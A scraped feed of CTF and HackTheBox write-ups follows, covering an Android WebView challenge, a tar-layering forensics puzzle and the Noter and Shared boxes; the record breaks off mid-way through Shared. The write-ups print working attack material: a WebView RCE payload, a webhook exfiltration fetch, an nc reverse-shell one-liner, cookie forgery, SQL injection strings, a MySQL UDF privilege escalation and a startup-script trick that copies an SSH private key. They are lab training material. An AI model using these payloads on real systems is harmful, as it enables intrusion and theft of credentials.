android:compileSdkVersionCodename=&quot;12&quot; package=&quot;x.y.z&quot; platformBuildVersionCode=&quot;32&quot; platformBuildVersionName=&quot;12&quot;&amp;gt; &amp;lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&amp;gt; &amp;lt;uses-permission android:name=&quot;android.permission.READ_EXTERNAL_STORAGE&quot;/&amp;gt; &amp;lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&amp;gt; &amp;lt;uses-permission android:name=&quot;android.permission.MANAGE_EXTERNAL_STORAGE&quot;/&amp;gt; &amp;lt;uses-permission android:name=&quot;android.permission.STORAGE&quot;/&amp;gt; &amp;lt;application android:allowBackup=&quot;true&quot; android:appComponentFactory=&quot;androidx.core.app.CoreComponentFactory&quot; android:dataExtractionRules=&quot;@xml/data_extraction_rules&quot; android:fullBackupContent=&quot;@xml/backup_rules&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:roundIcon=&quot;@mipmap/ic_launcher_round&quot; android:supportsRtl=&quot;true&quot; android:theme=&quot;@style/Theme.Abc&quot;&amp;gt; &amp;lt;service android:enabled=&quot;true&quot; android:exported=&quot;true&quot; android:name=&quot;x.y.z.IService&quot; android:process=&quot;:remote&quot;&amp;gt; &amp;lt;intent-filter&amp;gt; &amp;lt;action android:name=&quot;x.y.z.ServicesOut&quot;/&amp;gt; &amp;lt;/intent-filter&amp;gt; &amp;lt;/service&amp;gt; &amp;lt;activity android:exported=&quot;true&quot; android:name=&quot;x.y.z.a&quot;&amp;gt; &amp;lt;meta-data android:name=&quot;android.app.lib_name&quot; android:value=&quot;&quot;/&amp;gt; &amp;lt;intent-filter&amp;gt; &amp;lt;action android:name=&quot;android.intent.action.CUSTOM_INTENT&quot;/&amp;gt; &amp;lt;data android:host=&quot;bi0s&quot; android:scheme=&quot;android&quot;/&amp;gt; &amp;lt;/intent-filter&amp;gt; &amp;lt;/activity&amp;gt; &amp;lt;activity android:exported=&quot;true&quot; android:name=&quot;x.y.z.m&quot;&amp;gt; &amp;lt;intent-filter&amp;gt; &amp;lt;action android:name=&quot;android.intent.action.MAIN&quot;/&amp;gt; &amp;lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&amp;gt; &amp;lt;/intent-filter&amp;gt; &amp;lt;meta-data android:name=&quot;android.app.lib_name&quot; android:value=&quot;&quot;/&amp;gt; &amp;lt;/activity&amp;gt; &amp;lt;provider android:authorities=&quot;x.y.z.androidx-startup&quot; android:exported=&quot;false&quot; android:name=&quot;androidx.startup.InitializationProvider&quot;&amp;gt; &amp;lt;meta-data android:name=&quot;androidx.emoji2.text.EmojiCompatInitializer&quot; android:value=&quot;androidx.startup&quot;/&amp;gt; &amp;lt;meta-data android:name=&quot;androidx.lifecycle.ProcessLifecycleInitializer&quot; android:value=&quot;androidx.startup&quot;/&amp;gt; &amp;lt;/provider&amp;gt; &amp;lt;/application&amp;gt;&amp;lt;/manifest&amp;gt;We can tell that the main activity that is being launched when the app is opened on the phone is named x.y.z.m. Decompiling the APK with jadx we get the following source code:package x.y.z; import android.content.Intent; import android.os.Bundle; import android.view.View; import android.widget.ImageButton; import androidx.appcompat.app.AppCompatActivity; /* loaded from: classes.dex */ public class m extends AppCompatActivity { /* JADX INFO: Access modifiers changed from: protected */ @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity public void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_m); ((ImageButton) findViewById(R.id.btn)).setOnClickListener(new View.OnClickListener() { // from class: x.y.z.m$$ExternalSyntheticLambda0 @Override // android.view.View.OnClickListener public final void onClick(View view) { m.this.m2016lambda$onCreate$0$xyzm(view); } }); } /* JADX INFO: Access modifiers changed from: package-private */ /* renamed from: lambda$onCreate$0$x-y-z-m reason: not valid java name */ public /* synthetic */ void m2016lambda$onCreate$0$xyzm(View view) { startActivity(new Intent(this, a.class)); } }Basically, all this code does is create a button, and setting the button’s onClick method to launch a new intent, targeting the x.y.z.a class which can be seen below:public class a extends AppCompatActivity { static final /* synthetic */ boolean $assertionsDisabled = false; /* JADX INFO: Access modifiers changed from: protected */ @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity public void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_a); WebView webView = (WebView) findViewById(R.id.webView); boolean z = true; webView.getSettings().setJavaScriptEnabled(true); webView.addJavascriptInterface(new c(this), &quot;client&quot;); webView.getSettings().getAllowFileAccess(); webView.getSettings().getAllowContentAccess(); webView.getSettings().getAllowUniversalAccessFromFileURLs(); webView.getSettings().getDomStorageEnabled(); webView.getSettings().setUseWideViewPort(true); webView.getSettings().setAppCacheEnabled(true); webView.getSettings().setAllowFileAccess(true); Intent intent = getIntent(); if (intent == null) { webView.loadUrl(&quot;https://google.com&quot;); } Uri data = intent.getData(); if (data != null) { String queryParameter = data.getQueryParameter(&quot;web&quot;); Log.d(&quot;TAG&quot;, &quot;onCreate: &quot; + queryParameter); if (queryParameter == null) { z = false; } if (z &amp;amp; URLUtil.isValidUrl(queryParameter)) { webView.loadUrl(queryParameter); return; } else if (!queryParameter.contains(&quot;html&quot;)) { return; } else { webView.loadUrl(queryParameter); return; } } webView.loadUrl(&quot;https://google.com&quot;); } }This is basically the meat of the challenge. The onCreate method creates a webView object, adds a JavascriptInterface to it, and then sets a bunch of options for the webview. If we had a remote instance that we needed to attack then it would probably be interesting to see if we could use the setAllowFileAccess option into path traversal, however since we only have the instance running locally we won’t bother with that.The method then checks if the intent contains any data, and if it does, and that data contains a queryParameter with the value “web” it will load that page via the webView.The webView object and why it can totally ruin your dayThe reason that the webView object has Javascript disabled by default is that it can very quickly lead to RCE if the user visits a malicious site via the webView.Let’s say that the application has created a webView object, assigned a JavascriptInterface to it, and it then visits a site with the following content:&amp;lt;!-- javascriptBridge is the name of the Android exposed object --&amp;gt;&amp;lt;script&amp;gt;function execute(cmd){ return javascriptBridge.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;getRuntime&#39;,null).invoke(null,null).exec(cmd);}execute([&#39;/system/bin/sh&#39;,&#39;-c&#39;,&#39;echo \\&quot;mwr\\&quot; &amp;gt; /mnt/sdcard/mwr.txt&#39;]);&amp;lt;/script&amp;gt;And that is all there is to getting RCE. For this reason it’s not recommended to use a JavascriptInterface with webViews unless completely necessary. There are some precautions however. For example, the application could use the @JavascriptInterface annotation to only allow the interface to only expose specific methods, which is actually what is happening in this challenge.package x.y.z; import android.webkit.JavascriptInterface; /* loaded from: classes.dex */ public class c { public c(a aVar) { } @JavascriptInterface public String d() { return new h().s(BuildConfig.APPLICATION_ID); } }And here is the content of the h class:public final class h { public static final Companion Companion = new Companion(null); public final native String s(String str); public final native String ss(String str); /* loaded from: classes.dex */ public static final class Companion { public /* synthetic */ Companion(DefaultConstructorMarker defaultConstructorMarker) { this(); } private Companion() { } } static { System.loadLibrary(&quot;o&quot;); } }As we can see, we only have access to the d method of the JavascriptInterface named client. Let’s use Frida to get the application to visit a URL of our choice, and then put some malicious Javascript on it.Since no data is supplied with the intent, we first need to hook the getData() function, so that it returns a URI with a queryParameter named “web”, which will contain our URL. The frida script used for this can be seen below:Java.perform(function () { var Intent = Java.use(&#39;android.content.Intent&#39;); Intent.getData.overload().implementation = function() { console.log(&quot;-------------------HOOKED getData-----------------&quot;); var UriBuilder = Java.use(&#39;android.net.Uri$Builder&#39;); var UriBuilderInstance = UriBuilder.$new(); var String = Java.use(&#39;java.lang.String&#39;); var str1 = String.$new(&quot;https://something-here.eu.ngrok.io/test.html&quot;); var strKey = String.$new(&quot;web&quot;) UriBuilderInstance.appendQueryParameter(strKey,str1); var uri = UriBuilderInstance.build(); console.log(uri.toString()); console.log(uri.getQueryParameter(&quot;web&quot;)); var result = this.getData(); console.log(result); console.log(uri.getQueryParameter(&quot;web&quot;)); return uri; };});And the HTML for the site hosted via ngrok can be found below:&amp;lt;!-- client is the name of the Android exposed object --&amp;gt;HELLO WORLD&amp;lt;script&amp;gt;fetch(`https://webhook.site/your-webhook-here?msg=${btoa(JSON.stringify(client.d()))}`);;;&amp;lt;/script&amp;gt;My teammate found this way of getting the result of the d function. Since the d function returns a string we can simply call the function, Stringify it and convert it to base64 before visiting our webhook with the data in the url parameter “msg”.This is done to simplify the solving process slightly, as the h.s() being returned in d is a native function, which would mean that normally we would have to find and reverse engineer the function found in libo.so to find out what it actually does or returns.We view the site in the app on our emulator, and on the webhook we get the following a lookup with the following query string:msg=ImJpMHNDVEZ7NG5kcjAxZF8xNSI=, which decodes to &quot;bi0sCTF{4ndr01d_15&quot;, the first part of the flag!Getting the second part of the flag is trivial at this point. We simply hook the h.s() method called implicitly via our JavascriptInterface to return h.ss() instead. We then have the following frida script:Java.perform(function () { var Intent = Java.use(&#39;android.content.Intent&#39;); Intent.getData.overload().implementation = function() { console.log(&quot;-------------------HOOKED getData-----------------&quot;); var UriBuilder = Java.use(&#39;android.net.Uri$Builder&#39;); var UriBuilderInstance = UriBuilder.$new(); var String = Java.use(&#39;java.lang.String&#39;); var str1 = String.$new(&quot;https://something-here.eu.ngrok.io/test.html&quot;); var strKey = String.$new(&quot;web&quot;) UriBuilderInstance.appendQueryParameter(strKey,str1); var uri = UriBuilderInstance.build(); console.log(uri.toString()); console.log(uri.getQueryParameter(&quot;web&quot;)); var result = this.getData(); console.log(result); console.log(uri.getQueryParameter(&quot;web&quot;)); return uri; }; var H = Java.use(&#39;x.y.z.h&#39;); H.s.overload(&quot;java.lang.String&quot;).implementation = function(arg1) { console.log(&quot;-------------------HOOKED s-----------------&quot;); console.log(&quot;The input arg1 is &quot; + arg1); return H.$new().ss(arg1); };});We then get the final part of the flag: &quot;bi0sCTF{4ndr01d_15_50_vuln3r4bl3}&quot;" }, { "title": "Tar and Feathers - FE-CTF 2022 writeup", "url": "/posts/Tar_and_feathers/", "categories": "Writeup, CTF", "tags": "forensics", "date": "2022-10-30 12:38:00 +0100", "snippet": "SummaryThis challenge revolves around extracting a bunch of layers from a tar archive, and then rearranging those layers into other files. In short, someone at FE got creative with their use of tar :)Extracting all layers of the first archiveWe are given a file, tar-and-feathers.tgz, which is a POSIX tar archive. Trying to extract from the archive results in a new archive named something like 25 and so on. We quickly realised that the name of each layer represented a hex value. Our idea was then to fully extract all layers from the original archive, and then assemble all the hex values we are given into a new file. Of course we need to also make sure that we get the order of the layers right when creating the new file. For extraction we used this quick and dirty script:#!/bin/bashfound=1next=&#39;tar-and-feathers.tgz&#39;while [[ ${found} -eq 1 ]]; do echo &quot;Untaring - $next&quot; tmp=$(tar -tf $next) tar -tf $next&amp;gt;&amp;gt;file tar -xf $next next=$tmpdoneexit 0This script extracts all the layers, while adding the names of the layers into a file.We can then write all these bytes to a file, resulting in a new tar archive, which contains these files:E2.tar offsets.py runme.py* tar-and-feathers.tgz top.pngThe challenge in layer 2The source of runme.py can be found below:#!/usr/bin/env python3import osimport sysimport subprocessfrom offsets import offsetsif len(sys.argv) != 2: print(f&#39;Usage: {sys.argv[0]} &amp;lt;outfile&amp;gt;&#39;, file=sys.stderr) exit(-1)INIT = &#39;tar-and-feathers.tgz&#39;def run(cmd): return subprocess.check_output(cmd, shell=True)def unpack1(name): filemagic = run(f&#39;file {name}&#39;) if b&#39;bzip2&#39; in filemagic: run(f&#39;mv {name} {name}.bz2&#39;) run(f&#39;bunzip2 {name}.bz2&#39;) return unpack1(name) return run(f&#39;tar xfv {name}&#39;).strip().decode()def getbyte(n): print(f&#39;getbyte({n}) = &#39;, end=&#39;&#39;, file=sys.stderr, flush=True) prev = None for _ in range(n + 1): next = unpack1(prev or INIT) if prev and prev != next: os.unlink(prev) try: byte = int(next, 16) except: os.unlink(next) raise prev = next os.unlink(next) print(f&#39;0x{byte:02x}&#39;, file=sys.stderr) return bytedef unpack(path): data = bytes(getbyte(offset) for offset in offsets) with file(path, &#39;wb&#39;) as fd: fd.write(data)unpack(sys.argv[1])runme.py seems to be a script that extracts each layer of the original tar archive, until it reaches a specific layer or offset, and then prints that layers name as a byte. It does this for each of the offsets in the offsets file, meaning it takes ages for it to run, and we would probably still be waiting on this script to be done if we hadn’t optimized it. We basically this script, found the highest offset, ran it once looking for that offset and wrote all the extracted layer names to a file.Modified runme.py:#!/usr/bin/env python3import osimport sysimport subprocessfrom offsets import offsetsif len(sys.argv) != 2: print(f&#39;Usage: {sys.argv[0]} &amp;lt;outfile&amp;gt;&#39;, file=sys.stderr) exit(-1)INIT = &#39;tar-and-feathers.tgz&#39;def run(cmd): return subprocess.check_output(cmd, shell=True)def unpack1(name): filemagic = run(f&#39;file {name}&#39;) if b&#39;bzip2&#39; in filemagic: run(f&#39;mv {name} {name}.bz2&#39;) run(f&#39;bunzip2 {name}.bz2&#39;) return unpack1(name) return run(f&#39;tar xfv {name}&#39;).strip().decode()def getbyte(n): print(f&#39;getbyte({n}) = &#39;, end=&#39;&#39;, file=sys.stderr, flush=True) prev = None with open(&quot;outfile&quot;, &#39;w&#39;) as fd: for _ in range(n + 1): next = unpack1(prev or INIT) if prev and prev != next: os.unlink(prev) try: byte = int(next, 16) except: os.unlink(next) raise prev = next fd.write(next+&#39;\\n&#39;) os.unlink(next) print(f&#39;0x{byte:02x}&#39;, file=sys.stderr) return bytedef unpack(path): data = bytes(getbyte(50382))unpack(sys.argv[1])We then created the script below so that instead of extracting all the layers it simply looked up the value of the layer in an array, and wrote the bytes to a file named output:from offsets import offsetsimport binasciiwith open(&quot;outfile&quot;, &quot;r&quot;) as f: l = f.readlines()for i,line in enumerate(l): l[i] = line.strip()print(l)with open (&quot;output&quot;, &quot;wb&quot;) as f: for offset in offsets: f.write(binascii.unhexlify(l[offset]))This gets you a pdf:While text in the pdf has been “redacted” by putting a black bar over it, the text is still in the file and can be extracted via the following:bitis@Workstation ~/c/f/t/_file_decoded.extracted&amp;gt; pdftotext download-1.pdf &amp;amp;&amp;amp; cat download-1.txtflag{it’s turtles all the way down}1" }, { "title": "Noter writeup", "url": "/posts/Noter/", "categories": "Writeup, HackTheBox", "tags": "medium-box, fuzzing, flask-unsign, mysql", "date": "2022-09-25 12:00:00 +0200", "snippet": "SummaryThis medium box was quite tricky, especially the root step, which took a while to figure out. The box focuses on exploiting a flask web application, alongside enumeration an ftp service hoste on the box. Finally to get root privileges, you have to exploit the fact that you access to mysql as root, which you can leverage into reading the root flag.FootholdWe start out by doing an nmap port scan.┌──(bitis㉿workstation)-[~/htb/Machines/noter]└─$ nmap -sC -sV 10.129.146.253Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-25 20:21 CESTNmap scan report for 10.129.146.253Host is up (0.054s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)| 256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)|_ 256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)5000/tcp open http Werkzeug httpd 2.0.2 (Python 3.8.10)|_http-title: NoterService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.66 secondsThe system has three ports open. Port 21, 22 and 5000, which is hosting a http service. We also note that the http service is using Werkzeug, meaning that the web application hosted on the port is most likely a flask application. If we visit the application we get greeted with the following note taking application:Noter landing pageOnce we login, we notice that we have a session cookie.Registration and cookieWe can use flask-unsign to decode the cookie and try to find the secret it was signed with:┌──(bitis㉿workstation)-[~/htb/Machines/noter]└─$ flask-unsign -d -c eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Yrc3eg.PuthvwTy0NMMCxNs8N_GneHU-9c{&#39;logged_in&#39;: True, &#39;username&#39;: &#39;test&#39;}┌──(bitis㉿workstation)-[~/htb/Machines/noter]└─$ flask-unsign -u -c eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Yrc3eg.PuthvwTy0NMMCxNs8N_GneHU-9c[*] Session decodes to: {&#39;logged_in&#39;: True, &#39;username&#39;: &#39;test&#39;}[*] No wordlist selected, falling back to default wordlist..[*] Starting brute-forcer with 8 threads..[*] Attempted (2048): -----BEGIN PRIVATE KEY-----gt;[*] Attempted (11136): Z5Ke168AcyTrZwlNW3OZ1H87liw3Of[+] Found secret key after 18560 attemptsMy_API_Key&amp;gt;e&#39;secret123&#39;We have now found the secret key used to sign the session cookie. This means that we can create our own cookie, potentially login in as other users on the site. To enumerate users, we can use the login functionality of the site. If we attempt to login with a invalid user name, the application tells us “Invalid crdentials”However if we attempt to login as a existing user but with a wrong password we get told “Invalid login”We can use wfuzz to fuzz the application for valid usernames like so:┌──(bitis㉿workstation)-[~/htb/Machines/noter]└─$ wfuzz -u &#39;http://noter.htb:5000/login&#39; -X POST -d &#39;username=FUZZ&amp;amp;password=aaaadwhadw&#39; -w /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt --hs &quot;Invalid credentials&quot; /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer *********************************************************Target: http://noter.htb:5000/loginTotal requests: 8295455=====================================================================ID Response Lines Word Chars Payload =====================================================================000000113: 200 68 L 110 W 2032 Ch &quot;blue&quot; 000007198: 200 68 L 110 W 2032 Ch &quot;Blue&quot; As we can see from the output of wfuzz we have found two usernames, “blue” and “Blue”. We can then sign a flask cookie using flask-unsign once more.┌──(bitis㉿workstation)-[~/htb/Machines/noter]└─$ flask-unsign --sign --cookie &quot;{&#39;logged_in&#39;: True, &#39;username&#39;: &#39;blue&#39;}&quot; --secret &#39;secret123&#39;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YrdHUg.Pp4Ss88nFXoNRA5W7jHUkzkZ-9cUsing this cookie we can go to the “blue” notes. In one of the notes are the ftp credentials blue:blue@Noter!While scoping out the ftp service we find a pdf.┌──(bitis㉿workstation)-[~/htb/Machines/noter]└─$ ftp noter.htbConnected to noter.htb.220 (vsFTPd 3.0.3)Name (noter.htb:bitis): blue331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&amp;gt; ls229 Entering Extended Passive Mode (|||15193|)150 Here comes the directory listing.drwxr-xr-x 2 1002 1002 4096 May 02 23:05 files-rw-r--r-- 1 1002 1002 12569 Dec 24 2021 policy.pdf226 Directory send OK.ftp&amp;gt; get policy.pdflocal: policy.pdf remote: policy.pdf229 Entering Extended Passive Mode (|||46037|)150 Opening BINARY mode data connection for policy.pdf (12569 bytes).100% |***********************************************************************************************************************************************************************************************| 12569 149.00 KiB/s 00:00 ETA226 Transfer complete.12569 bytes received in 00:00 (51.96 KiB/s)The pdf contains the line: 4. Default user-password generated by the application is in the format of &quot;username@site_name!&quot; (This applies to all your applications). We can also see that the pdf was written by ftp_admin. If we try to login as ftp_admin on the ftp service while making sure to follow the default password scheme we get access:┌──(bitis㉿workstation)-[~/htb/Machines/noter]└─$ ftp noter.htb Connected to noter.htb.220 (vsFTPd 3.0.3)Name (noter.htb:bitis): ftp_admin331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&amp;gt; ls229 Entering Extended Passive Mode (|||31864|)150 Here comes the directory listing.-rw-r--r-- 1 1003 1003 25559 Nov 01 2021 app_backup_1635803546.zip-rw-r--r-- 1 1003 1003 26298 Dec 01 2021 app_backup_1638395546.zip226 Directory send OK.ftp&amp;gt; Downloading the two app backups and analyzing them, we immediatly see something interesting. One of the backups contains SQL credentials:app = Flask(__name__)# Config MySQLapp.config[&#39;MYSQL_HOST&#39;] = &#39;localhost&#39;app.config[&#39;MYSQL_USER&#39;] = &#39;root&#39;app.config[&#39;MYSQL_PASSWORD&#39;] = &#39;Nildogg36&#39;app.config[&#39;MYSQL_DB&#39;] = &#39;app&#39;app.config[&#39;MYSQL_CURSORCLASS&#39;] = &#39;DictCursor&#39;# init MYSQLmysql = MySQL(app)The other backup contains the following code snippet:# Export remote@app.route(&#39;/export_note_remote&#39;, methods=[&#39;POST&#39;])@is_logged_indef export_note_remote(): if check_VIP(session[&#39;username&#39;]): try: url = request.form[&#39;url&#39;] status, error = parse_url(url) if (status is True) and (error is None): try: r = pyrequest.get(url,allow_redirects=True) rand_int = random.randint(1,10000) command = f&quot;node misc/md-to-pdf.js $&#39;{r.text.strip()}&#39; {rand_int}&quot; subprocess.run(command, shell=True, executable=&quot;/bin/bash&quot;) if os.path.isfile(attachment_dir + f&#39;{str(rand_int)}.pdf&#39;): return send_file(attachment_dir + f&#39;{str(rand_int)}.pdf&#39;, as_attachment=True) else: return render_template(&#39;export_note.html&#39;, error=&quot;Error occured while exporting the !&quot;) except Exception as e: return render_template(&#39;export_note.html&#39;, error=&quot;Error occured!&quot;) else: return render_template(&#39;export_note.html&#39;, error=f&quot;Error occured while exporting ! ({error})&quot;) except Exception as e: return render_template(&#39;export_note.html&#39;, error=f&quot;Error occured while exporting ! ({e})&quot;) else: abort(403)In short, the code takes a .md file from a url, attempts to convert it into a pdf, and also executes the contents of the file. This means if we make a .md file containing a reverse shell we should be able to get into the machine.I created a file named note.md containing the following rever shell oneliner: &#39; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.17.182 4444 &amp;gt;/tmp/f; #.We then get a reverse shell when exporting the note:┌──(bitis㉿workstation)-[~]└─$ nc -lvnp 4444 listening on [any] 4444 ...connect to [10.10.17.182] from (UNKNOWN) [10.129.146.253] 34658/bin/sh: 0: can&#39;t access tty; job control turned off$ iduid=1001(svc) gid=1001(svc) groups=1001(svc)Privilege escalationAfter adding our public key to the authorized_keys file we can ssh in as the svc user to get a more stable shell.Since we had credentials to the mysql database, and since mysqld was running as root, it might be interesting to try the exploit found here. I ran the following commands to get the flag:MariaDB [mysql]&amp;gt; create table foo(line blob);Query OK, 0 rows affected (0.014 sec)MariaDB [mysql]&amp;gt; insert into foo values(load_file(&#39;/home/svc/raptor_udf2.so&#39;));Query OK, 1 row affected (0.004 sec)MariaDB [mysql]&amp;gt; show variables like &#39;%plugin%&#39;;+-----------------+---------------------------------------------+| Variable_name | Value |+-----------------+---------------------------------------------+| plugin_dir | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ || plugin_maturity | gamma |+-----------------+---------------------------------------------+2 rows in set (0.002 sec)MariaDB [mysql]&amp;gt; select * from foo into dumpfile &#39;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so&#39;;Query OK, 1 row affected (0.001 sec)MariaDB [mysql]&amp;gt; create function do_system returns integer soname &#39;raptor_udf2.so&#39;;Query OK, 0 rows affected (0.001 sec)MariaDB [mysql]&amp;gt; select * from mysql.func;+-----------+-----+----------------+----------+| name | ret | dl | type |+-----------+-----+----------------+----------+| do_system | 2 | raptor_udf2.so | function |+-----------+-----+----------------+----------+1 row in set (0.001 sec)MariaDB [mysql]&amp;gt; select do_system(&#39;cat /root/root.txt &amp;gt; /tmp/flag.txt;chown svc:svc /tmp/flag.txt&#39;);+-----------------------------------------------------------------------------+| do_system(&#39;cat /root/root.txt &amp;gt; /tmp/flag.txt;chown svc:svc /tmp/flag.txt&#39;) |+-----------------------------------------------------------------------------+| 0 |+-----------------------------------------------------------------------------+1 row in set (0.005 sec)MariaDB [mysql]&amp;gt; \\! sh$ cat /tmp/flag.txt0780ed0d4344ec8598ab32e7812f629f$ Rooted!" }, { "title": "Shared writeup", "url": "/posts/Shared/", "categories": "Writeup, HackTheBox", "tags": "medium-box, redis, sqli", "date": "2022-08-14 15:00:00 +0200", "snippet": "SummaryFootholdWe start out by doing an nmap port scan:Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-14 15:25 CESTNmap scan report for 10.129.44.47Host is up (0.024s latency).Not shown: 65532 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey: | 3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA)| 256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA)|_ 256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519)80/tcp open http nginx 1.18.0|_http-title: Did not follow redirect to http://shared.htb|_http-server-header: nginx/1.18.0443/tcp open ssl/http nginx 1.18.0|_http-title: Did not follow redirect to https://shared.htb| tls-nextprotoneg: | h2|_ http/1.1| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US| Not valid before: 2022-03-20T13:37:14|_Not valid after: 2042-03-15T13:37:14|_http-server-header: nginx/1.18.0| tls-alpn: | h2|_ http/1.1|_ssl-date: TLS randomness does not represent timeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 44.36 secondsThe scan tells us that ports 22, 80 and 443 are open, and also that the webserver uses the hostname shared.htb, which we will then add to our /etc/hosts file.When we visit the site, it seems to be some type of webshop.We can see that they encourage us to take a look at their checkout functionality, and indeed there seems to be a subdomain for this specific feature:┌──(bitis㉿workstation)-[~]└─$ gobuster vhost -u shared.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt 1 ⨯===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://shared.htb[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/08/14 15:33:43 Starting gobuster in VHOST enumeration mode===============================================================Found: checkout.shared.htb (Status: 200) [Size: 3229]Progress: 67551 / 114442 (59.03%) ^C[!] Keyboard interrupt detected, terminating. ===============================================================2022/08/14 15:36:25 Finished===============================================================After adding this to our hosts file we can check out this domain as well:It seems that the site is using a cookie to keep track of the customers cart.The cookie value is vunlerable to sql-injection. Using the UNION operator we can figure out which database the checkout functionality is using:Using the following injection:{&quot;&#39; and 0=1 union select 1, table_name, 3 from information_schema.tables where table_schema = &#39;checkout&#39;-- -&quot;:&quot;1&quot;} we can list the tables that belong to the checkout database. This result in us finding the user table.Using the string: {&quot;&#39; and 0=1 union select 1, username, id from user-- -&quot;:&quot;1&quot;} we find a user by the name of james_mason: And finally, we also get an md5 encrypted password:Cracking it via crackstation gives the credentials james_mason:Soleil101We can then connect to the machine via ssh, however to get the user flag we first need to pivot to another user, dan_smith.PivotChecking id, we can tell that james is part of the developer group, and via pspy we can tell that this group is running some interesting commands on the machine:2022/08/14 10:15:01 CMD: UID=1001 PID=2204 | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ &amp;amp;&amp;amp; /usr/local/bin/ipython 2022/08/14 10:15:01 CMD: UID=1001 PID=2205 | /usr/bin/pkill ipython 2022/08/14 10:15:01 CMD: UID=0 PID=2206 | /bin/bash /root/c.sh 2022/08/14 10:15:01 CMD: UID=0 PID=2207 | sleep 5 2022/08/14 10:15:01 CMD: UID=1001 PID=2208 | /usr/bin/python3 /usr/local/bin/ipython Ipython has had multiple CVE’s disclosed at this point, and one that looks interesting is CVE-2022-21699, which should allow us to run code as another user on the system. If we go to Ipython’s github repository, they have a security advisory, including a proof of concept of the vulnerability.To get access to the other user on the system, we simply follow the PoC, and create the required folders and files in the /opt/scripts_review directory:james_mason@shared:/opt/scripts_review$ mkdir -m 777 profile_defaultjames_mason@shared:/opt/scripts_review$ mkdir -m 777 profile_default/startupjames_mason@shared:/opt/scripts_review$ echo &quot;import os; os.system(&#39;cat ~/.ssh/id_rsa &amp;gt; /tmp/key&#39;)&quot; &amp;gt; profile_default/startup/foo.pyOnce the system has had some time to run the script, we can read the ssh key of the dan_smith user in tmp.james_mason@shared:/tmp$ cat key -----BEGIN OPENSSH PRIVATE 